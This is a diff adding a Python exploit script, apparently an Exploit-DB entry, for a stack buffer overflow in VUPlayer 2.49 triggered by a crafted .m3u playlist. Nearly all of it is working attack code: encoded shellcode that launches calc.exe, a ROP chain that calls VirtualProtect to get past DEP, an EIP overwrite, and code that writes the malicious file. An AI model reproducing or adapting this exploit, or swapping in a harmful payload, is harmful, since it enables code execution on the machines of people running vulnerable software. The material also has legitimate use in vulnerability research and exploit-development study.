@@ -1,0 +1,88 @@
+#!/usr/bin/env python
+#
+# Exploit Title: VUPlayer <=2.49 .M3u Buffer overflow exploit with DEP bypass
+# Date: 26-06-2016
+# Exploit Author: secfigo
+# Vendor Homepage: http://vuplayer.com/
+# Software Link: https://www.exploit-db.com/apps/39adeb7fa4711cd1cac8702fb163ded5-vuplayersetup.exe 
+# Version: VUPlayer <=2.49
+# Tested on: Windows 7 SP1 DEP=alwayson
+# Greetz: Raghu, nullSingapore
+###################################################################################
+
+
+import struct
+
+###################################################################################
+# Shellcode
+# windows/exec CMD=calc.exe with size 227 and bad characters "\x00\x09\x0a\x0d\x1a"
+###################################################################################
+
+shellcode = ("\xbb\xc7\x16\xe0\xde\xda\xcc\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
+"\x33\x83\xc0\x04\x31\x58\x0e\x03\x9f\x18\x02\x2b\xe3\xcd\x4b"
+"\xd4\x1b\x0e\x2c\x5c\xfe\x3f\x7e\x3a\x8b\x12\x4e\x48\xd9\x9e"
+"\x25\x1c\xc9\x15\x4b\x89\xfe\x9e\xe6\xef\x31\x1e\xc7\x2f\x9d"
+"\xdc\x49\xcc\xdf\x30\xaa\xed\x10\x45\xab\x2a\x4c\xa6\xf9\xe3"
+"\x1b\x15\xee\x80\x59\xa6\x0f\x47\xd6\x96\x77\xe2\x28\x62\xc2"
+"\xed\x78\xdb\x59\xa5\x60\x57\x05\x16\x91\xb4\x55\x6a\xd8\xb1"
+"\xae\x18\xdb\x13\xff\xe1\xea\x5b\xac\xdf\xc3\x51\xac\x18\xe3"
+"\x89\xdb\x52\x10\x37\xdc\xa0\x6b\xe3\x69\x35\xcb\x60\xc9\x9d"
+"\xea\xa5\x8c\x56\xe0\x02\xda\x31\xe4\x95\x0f\x4a\x10\x1d\xae"
+"\x9d\x91\x65\x95\x39\xfa\x3e\xb4\x18\xa6\x91\xc9\x7b\x0e\x4d"
+"\x6c\xf7\xbc\x9a\x16\x5a\xaa\x5d\x9a\xe0\x93\x5e\xa4\xea\xb3"
+"\x36\x95\x61\x5c\x40\x2a\xa0\x19\xbe\x60\xe9\x0b\x57\x2d\x7b"
+"\x0e\x3a\xce\x51\x4c\x43\x4d\x50\x2c\xb0\x4d\x11\x29\xfc\xc9"
+"\xc9\x43\x6d\xbc\xed\xf0\x8e\x95\x8d\x97\x1c\x75\x7c\x32\xa5"
+"\x1c\x80")
+
+junk = "HTTP://" + "A"*1005
+
+
+
+
+###################################################################################
+# rop gadgets with some modifications
+# bad characters = "\x00\x09\x0a\x0d\x1a"
+###################################################################################
+
+def create_rop_chain():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      0x10010157,  # POP EBP # RETN [BASS.dll] 
+      0x10010157,  # skip 4 bytes [BASS.dll]
+      0x10015f77,  # POP EAX # RETN [BASS.dll] 
+      0xfffffdff,  # Value to negate, will become 0x00000201
+      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
+      0x10032f72,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
+      0x10015f82,  # POP EAX # RETN [BASS.dll] 
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
+      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] 
+      0x101049ec,  # POP ECX # RETN [BASSWMA.dll] 
+      0x101082db,  # &Writable location [BASSWMA.dll]
+      0x1001621c,  # POP EDI # RETN [BASS.dll] 
+      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
+      0x10604154,  # POP ESI # RETN [BASSMIDI.dll] 
+      0x10101c02,  # JMP [EAX] [BASSWMA.dll]
+      0x10015fe7,  # POP EAX # RETN [BASS.dll] 
+      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
+      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
+      0x10022aa7,  # ptr to 'jmp esp' [BASS.dll]
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+rop_chain = create_rop_chain()
+
+
+eip = struct.pack('<L',0x10601033) # RETN (BASSMIDI.dll)
+
+nops ="\x90"* 16
+
+buffer = junk + eip + rop_chain + nops+ shellcode+ "C"*(3000-len(junk)-len(eip)-len(rop_chain)-len(nops)-len(shellcode))
+
+print "[+] Creating .m3u file of size "+ str(len(buffer))
+file = open('vuplayer-dep.m3u','w');
+file.write(buffer);
+file.close();
+print "[+] Done creating the file"
